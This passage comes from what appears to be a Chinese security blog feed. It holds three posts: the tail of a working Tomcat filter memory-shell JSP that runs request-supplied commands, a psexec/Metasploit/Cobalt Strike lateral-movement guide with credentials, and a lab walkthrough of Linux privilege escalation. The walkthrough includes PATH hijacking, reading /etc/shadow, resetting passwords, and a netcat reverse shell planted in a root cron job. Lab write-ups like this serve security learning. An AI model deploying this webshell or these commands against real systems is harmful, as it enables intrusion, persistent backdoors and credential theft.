class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">String cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (cmd!= <span class="keyword">null</span>) &#123;</span><br><span class="line">Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line"><span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">servletResponse.getOutputStream().flush();</span><br><span class="line">servletResponse.getOutputStream().close();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">String name = <span class="string">&quot;filterDemo&quot;</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line">filterDemo filter = <span class="keyword">new</span> filterDemo();</span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//添加filterDef</span></span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line">FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line"><span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/zzz&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">filterConfigs.put(name,filterConfig);</span><br><span class="line">out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">out.write(<span class="string">&quot;Injected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>利用psexec进行横向移动</title>
    <url>/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    <content><![CDATA[<h1 id="利用psexec进行横向移动"><a href="#利用psexec进行横向移动" class="headerlink" title="利用psexec进行横向移动"></a>利用psexec进行横向移动</h1><p>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启，占用139、445端口)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，所以杀毒软件将其列在白名单中。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec的基本原理：</span><br><span class="line">通过ipc$连接admin$，释放二进制文件psexecsvc.exe到目标</span><br><span class="line">通过服务管理SCManager远程创建一个psexec服务，并启动服务</span><br><span class="line">客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</span><br><span class="line">运行结束后删除服务</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec的使用前提：</span><br><span class="line">1.对方主机开启了 admin$共享，如果关闭了admin$共享，会提示：找不到网络名</span><br><span class="line">2.对方未开启防火墙</span><br><span class="line">3.如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</span><br><span class="line">4.如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</span><br><span class="line"></span><br><span class="line">补充</span><br><span class="line">远程机器的 139 或 445 端口需要开启状态，即 SMB；</span><br><span class="line">明文密码或者 NTLM 哈希；</span><br><span class="line">具备将文件写入共享文件夹的权限；</span><br><span class="line">能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE</span><br><span class="line">能够启动所创建的服务：SERVICE_QUERY_STATUS &amp;&amp; SERVICE_START</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用如下命令：</span><br><span class="line"></span><br><span class="line">-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line"></span><br><span class="line">-u：用户名</span><br><span class="line"></span><br><span class="line">-p：密码</span><br><span class="line"></span><br><span class="line">-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</span><br></pre></td></tr></table></figure>

<p><code>PsExec64.exe -accepteula \\192.168.10.3 -u WIN-U8TRGT93CTR\administrator -p &lt;password&gt; -s cmd.exe</code></p>
<p>连上大概就是这个样子，返回了一个cmd</p>
<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220912205445125.png" alt="image-20220912205445125"></p>
<p>这里也可以先建立ipc连接后直接调用<code>PsExec64.exe</code>调用cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.10.3\ipc$ &lt;password&gt; /user:administrator</span><br><span class="line">PsExec64.exe -accepteula \\192.168.10.3 cmd.exe</span><br></pre></td></tr></table></figure>

<p>也可以直接执行命令（在建立ipc连接的基础上）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\192.168.10.3 ipconfig</span><br></pre></td></tr></table></figure>

<h2 id="msf中的psexec"><a href="#msf中的psexec" class="headerlink" title="msf中的psexec"></a>msf中的psexec</h2><p>MSF中的psexec模块主要讲下面两个模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec：该模块生成的payload是exe程序</span><br><span class="line"></span><br><span class="line">exploit/windows/smb/psexec_psh ：该模块生成的payload主要是由powershell实现的</span><br></pre></td></tr></table></figure>

<p>显然powershell生成的payload免杀效果比exe的要好，但是windows xp、server2003默认不包含powershell环境。所以，这两个模块各有各自的优势。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"></span><br><span class="line">set rhost 192.168.10.131</span><br><span class="line"></span><br><span class="line">set smbuser administrator</span><br><span class="line"></span><br><span class="line">set smbpass x123456./@</span><br><span class="line"></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">攻击成功后，会返回一个meterpreter类型的session </span><br></pre></td></tr></table></figure>

<p>有些时候exe能连上但是msf上不能连上，这点需要注意。</p>
<h2 id="cs中的psexec"><a href="#cs中的psexec" class="headerlink" title="cs中的psexec"></a>cs中的psexec</h2><p>g，服务器在国外，好像被墙了，上不了线。</p>
<p>偷别人的图</p>
<p>查看目标所在网段其它主机<br>扫描主机</p>
<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/5.png" alt="在这里插入图片描述"></p>
<p>列出主机</p>
<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1.png" alt="在这里插入图片描述"></p>
<p>使用PsExec横向移动</p>
<p>右键要横向的目标主机，选择psexec的版本（32位64位或PowerShell）。</p>
<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/2.png" alt="在这里插入图片描述"></p>
<p>选择已经获得的凭据（明文、散列值、令牌都可以）、回连的listener、进行横向的session。</p>
<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/3.png" alt="在这里插入图片描述"></p>
<p>点击Launch，即会返回一个DC-1的session。</p>
<p><img src="/2022/09/13/%E5%88%A9%E7%94%A8psexec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/4.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title># 利用Escalate_Linux靶机学习11种linux提权</title>
    <url>/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="利用Escalate-Linux靶机学习11种linux提权"><a href="#利用Escalate-Linux靶机学习11种linux提权" class="headerlink" title="利用Escalate_Linux靶机学习11种linux提权"></a>利用Escalate_Linux靶机学习11种linux提权</h1><p>搭建好之后，开始进行测试。</p>
<p>首先开一下kali，对网段的靶机进行一个扫描，arp-scan -l</p>
<p>发现主机</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814122916292.png" alt="image-20220814122916292"></p>
<p>做一个简单的外网打点，扫端口，扫目录，拿shell，进内网</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123432519.png" alt="image-20220814123432519"></p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123600420.png" alt="image-20220814123600420"></p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123612490.png" alt="image-20220814123612490"></p>
<p>就直接给了个webshell</p>
<p>那现在就是拿主机的meterprete</p>
<p>使用msf进行攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure>

<p>此模块支持在本地监听一个端口，别人一旦访问该端口就会将该端口内的文件读取至本地执行（把webshell放在该端口下刚刚好）</p>
<p>设置服务端和本地地址都为攻击机ip，运行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set srvhost 192.168.52.129</span><br><span class="line">set lhost 192.168.52.129</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814135753234.png" alt="image-20220814135753234"></p>
<p>把给出的代码放到靶机执行（记得要url编码一下</p>
<p>这样就拿到了一个meterpreter</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814140443723.png" alt="image-20220814140443723"></p>
<p>进入shell环境</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814140534255.png" alt="image-20220814140534255"></p>
<h1 id="提权方式1：SUID提权"><a href="#提权方式1：SUID提权" class="headerlink" title="提权方式1：SUID提权"></a>提权方式1：SUID提权</h1><p><a href="https://www.freesion.com/article/5522129624/">靶机、软件搭建:13—LinEnum.sh（本地Linux枚举和提权辅助脚本） - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
<p>这里使用的是LinEnum.sh工具，下来我也会总结一个文章。</p>
<p>注：要进入tmp目录下继续wget，主要是因为tmp目录权限大。并且要先在kali上开启http.server的服务。</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814141703512.png" alt="image-20220814141703512"></p>
<p>先修改一下权限，然后执行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 LinEnum.sh</span><br><span class="line">./LinEnum.sh |more</span><br></pre></td></tr></table></figure>

<p>这个脚本会枚举出我们当前的一个linux环境的一些信息啊之类的东西。</p>
<p>使用以下命令找一下具有suid权限的程序</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814145141549.png" alt="image-20220814145141549"></p>
<p>tips：上一步中，如果要直接显示文件的权限，可以使用以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -type f 2&gt;/dev/null -exec ls -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>进入目录，直接执行，拿到权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/user3</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814145618134.png" alt="image-20220814145618134"></p>
<h1 id="提权方式2：环境变量劫持提权"><a href="#提权方式2：环境变量劫持提权" class="headerlink" title="提权方式2：环境变量劫持提权"></a>提权方式2：环境变量劫持提权</h1><p>简单来说就是SUID文件的权限高，而它去调用其他命令时，我们劫持了这个命令，并且这个命令的内容是/bin/bash，这样就相当于使用root权限运行了命令，拿到了高权限的shell。</p>
<p>首先是在user5的用户下面发现了SUID文件，执行这个SUID文件，发现其命令类似于ls命令，那好了，我们也创建一个ls命令，但是这个ls执行的内容是/bin/bash，从而我们拿到了高权限的shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/user5</span><br><span class="line">ls</span><br><span class="line">./script</span><br><span class="line">echo $PATH</span><br><span class="line">cd ../../../../../../</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH </span><br><span class="line">echo $PATH  </span><br><span class="line">chmod 755 /tmp/ls</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814151438796.png" alt="image-20220814151438796"></p>
<h1 id="提权方式3：破解-etc-shadow文件提权"><a href="#提权方式3：破解-etc-shadow文件提权" class="headerlink" title="提权方式3：破解/etc/shadow文件提权"></a>提权方式3：破解/etc/shadow文件提权</h1><p>这种方式实际上就是爆破root用户的密码</p>
<p>通过前面可知，我们能够通过命令劫持来拿到最高权限，那么我们也可以劫持命令，去读取/etc/shadow文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cat /etc/shadow&#x27; &gt;/tmp/ls</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814153305096.png" alt="image-20220814153305096"></p>
<p>接着复制root用户的账户和密码，并且保存为hash.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1&#x27; &gt; hash.txt</span><br></pre></td></tr></table></figure>

<p>使用john爆破</p>
<p><a href="https://blog.csdn.net/i_can1/article/details/107227565">(95条消息) John使用手册_1_Can的博客-CSDN博客_john工具用法</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt</span><br></pre></td></tr></table></figure>

<h1 id="提权方式4：修改sudoers文件中的用户密码提权"><a href="#提权方式4：修改sudoers文件中的用户密码提权" class="headerlink" title="提权方式4：修改sudoers文件中的用户密码提权"></a>提权方式4：修改sudoers文件中的用户密码提权</h1><p>还是使用前面的SUID文件，读取/etc/sudoers文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cat /etc/sudoers&#x27; &gt; /tmp/ls</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814160746738.png" alt="image-20220814160746738"></p>
<p>改user1的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;echo &quot;user1:pi1grim&quot; | chpasswd&#x27; &gt;/tmp/ls</span><br><span class="line">./script</span><br><span class="line">su user1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814160808281.png" alt="image-20220814160808281"></p>
<h1 id="提权方式5：使用计划任务提权crontab"><a href="#提权方式5：使用计划任务提权crontab" class="headerlink" title="提权方式5：使用计划任务提权crontab"></a>提权方式5：使用计划任务提权crontab</h1><p>计划任务就是定时任务，一般运维会采用脚本去定时执行，但是如果权限配置不当的话，就会存在一些问题。<br>在开始介绍提权方式之前，先介绍下crontab，crontab是linux的计划任务，启动后的服务时crond，配置文件为/etc/crontab，可以通过配置文件定期执行程序或者命令。或者直接使用crontab命令也可以。</p>
<p>首先我们看一下crontab的配置文件</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814161022978.png" alt="image-20220814161022978"></p>
<p>发现有一个每五分钟以root权限执行一次的文件是在user4的目录下面，所以我们需要user4的权限，因此我们可以通过第四种提权方式，先修改一下user的密码，登录user4。</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814174709181.png" alt="image-20220814174709181"></p>
<p>此时我们具备了编辑定时任务的权限。一个简单而且直接的办法是使用nc直接反弹shell至本机，但是经过测试后发现不行。用msf反弹shell</p>
<p>msfvenom生成的反弹shell可以。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.52.129 lport=8888</span><br></pre></td></tr></table></figure>

<p>生成的payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/arnclzn; nc 192.168.52.129 8888 0&lt;/tmp/arnclzn | /bin/sh &gt;/tmp/arnclzn 2&gt;&amp;1; rm /tmp/arnclzn</span><br></pre></td></tr></table></figure>

<p>随后给他弄到定时文件中去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;mkfifo /tmp/arnclzn; nc 192.168.52.129 8888 0&lt;/tmp/arnclzn | /bin/sh &gt;/tmp/arnclzn 2&gt;&amp;1; rm /tmp/arnclzn&#x27;  &gt; autoscript.sh</span><br></pre></td></tr></table></figure>

<p>等待上线</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 8888</span><br></pre></td></tr></table></figure>

<p>他奶奶的，结果路径搞错了，我等了半天没上线，cs也试了一下，我还以为是我的问题。</p>
<p>终于上线了，等我我好辛苦</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814184036930.png" alt="image-20220814184036930"></p>
<h1 id="提权方式6：利用sudo提权"><a href="#提权方式6：利用sudo提权" class="headerlink" title="提权方式6：利用sudo提权"></a>提权方式6：利用sudo提权</h1><p>查看sudoers文件信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cat /etc/sudoers&#x27; &gt;/tmp/ls</span><br><span class="line">chmod +x /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/home/user5/script</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814204440028.png" alt="image-20220814204440028"></p>
<p>注意看sudoers文件中的user8用户，其可以通过root身份运行vi。这给提权创造了空间。为什么呢？因为vi存在交互模式，即可以在vi中运行命令。<br>在提权之前，我们要先进入user8用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;echo &quot;user8:654321&quot; | chpasswd&#x27; &gt;/tmp/ls</span><br><span class="line">/home/user5/script</span><br><span class="line">su user8</span><br></pre></td></tr></table></figure>

<p>查看一下授权列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814204706956.png" alt="image-20220814204706956"></p>
<p>打开vi，使用sudo的原因就是用root权限来执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi   </span><br></pre></td></tr></table></figure>

<p>在vi中输入以下命令，成功获取root权限的终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814205424020.png" alt="image-20220814205424020"></p>
<p>注意：在拿到root权限后，想要退出当前终端可以使用exit命令退出，会重新回到vi界面中去，回到vi界面后，重新按照vi命令退出即可。</p>
<p>tips：上述演示是通过vi来获取root权限，其他要注意的命令包含find，less，more，git等等，在使用visudoers配置后，都会被利用来提权，比如使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /etc | sudo more</span><br></pre></td></tr></table></figure>

<p>然后输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>

<p>也一样可以拿到root权限</p>
<p>如下这个例子是当find被授权后，利用find提权，在找到f1文件后，执行shell。</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/63be551d50e942f1ac9a88ab9baaa219.png" alt="在这里插入图片描述"></p>
<h1 id="提权方式7：利用超级用户提权"><a href="#提权方式7：利用超级用户提权" class="headerlink" title="提权方式7：利用超级用户提权"></a>提权方式7：利用超级用户提权</h1><p>还是在user6账户下，通过读取sudoers文件来查看用户权限情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cat /etc/sudoers&#x27; &gt;/tmp/ls</span><br><span class="line">chmod +x /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/home/user5/script</span><br></pre></td></tr></table></figure>

<p>发现其中的user2有user1用户的权限，而user1又是root用户的权限，好了，这下也可以提权</p>
<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814205914830.png" alt="image-20220814205914830"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;echo &quot;user1:654321&quot; | chpasswd&#x27; &gt;/tmp/ls </span><br><span class="line">/home/user5/script</span><br><span class="line">echo &#x27;echo &quot;user2:654321&quot; | chpasswd&#x27; &gt;/tmp/ls</span><br><span class="line">/home/user5/script </span><br><span class="line">su user2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是为什么不直接登录user1捏</p>
<p>然后sudo su就可了</p>
<h1 id="提权方式8：利用-etc-passwd具有写入权限进行提权"><a href="#提权方式8：利用-etc-passwd具有写入权限进行提权" class="headerlink" title="提权方式8：利用/etc/passwd具有写入权限进行提权"></a>提权方式8：利用/etc/passwd具有写入权限进行提权</h1><p>思路：写入一个超级用户（uid为0的用户）进行提权<br>首先查看passwd文件的权限，发现属组对passwd文件有读写权限，这是不正确的配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/ls -l /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814213927506.png" alt="image-20220814213927506"></p>
<p>查看passwd文件发现user7属于root组</p>
